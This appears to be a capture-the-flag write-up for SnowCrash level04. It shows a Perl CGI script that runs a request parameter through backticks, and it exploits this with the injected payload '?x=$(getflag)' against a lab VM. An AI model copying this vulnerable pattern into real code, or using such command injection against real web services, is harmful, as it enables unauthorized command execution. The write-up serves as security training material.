We begin by exploring the files and find a Perl script named `level04.pl`.

```
level04@SnowCrash:~$ ls
level04.pl
```

Inspecting the contents of `level04.pl` reveals the following code:

```
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

The script runs a CGI program that takes a parameter `x` and executes it with an `echo` command. This indicates a potential command injection vulnerability.

We identify the website URL as `http://192.168.56.101:4747/` and craft a URL with a command injection payload:

```
http://192.168.56.101:4747/?x=$(getflag)
```

This injects the `getflag` command through the `x` parameter.

The response returns:

```
Check flag.Here is your token :
```

Success!
